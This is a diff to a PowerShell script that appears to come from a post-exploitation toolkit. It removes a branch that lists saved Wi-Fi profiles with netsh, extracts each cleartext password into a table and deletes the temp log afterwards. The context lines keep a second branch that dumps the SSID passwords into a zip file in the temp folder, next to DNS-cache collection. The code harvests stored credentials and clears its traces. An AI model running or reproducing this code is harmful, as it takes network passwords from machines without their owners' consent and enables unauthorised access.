@@ -820,27 +820,6 @@ If(-not($Installation) -or $Installation -ieq $null){
          echo $GetDnsData > $Env:TMP\dns.log;Get-Content -Path "$Env:TMP\dns.log"
          Remove-Item -Path "$Env:TMP\dns.log" -Force
 
-         ## Dump SSID passwords into terminal prompt
-         $profiles = netsh wlan show profiles|findstr /C:"All User Profile"
-         $DataParse = $profiles -replace 'All User Profile     :','' -replace ' ',''
-
-         ## Create Data Table for output
-         $mytable = New-Object System.Data.DataTable
-         $mytable.Columns.Add("WiFi SSID Name")|Out-Null
-         $mytable.Columns.Add("Password")|Out-Null
-
-         foreach($Token in $DataParse){
-            $DataToken = netsh wlan show profile name="$Token" key=clear|findstr /C:"Key Content"
-            $Key = $DataToken -replace 'Key Content            : ','' -replace ' ',''
-            ## Put results in the Data Table   
-            $mytable.Rows.Add("$Token","$Key")|Out-Null
-         }
-         ## Display Data Table
-         $mytable|Format-Table -AutoSize > $Env:TMP\wifidump.log
-         Get-Content -Path "$Env:TMP\wifidump.log";Remove-Item "$Env:TMP\wifidump.log" -Force
-
-      }Else{
-
          ## Dump SSID passwords into a zip file
          $DumpFolder = "SSIDump";$DumpFile = "SSIDump.zip"
          If(-not(Test-Path "$Env:TMP\$DumpFolder")){New-Item "$Env:TMP\$DumpFolder" -ItemType Directory -Force|Out-Null}
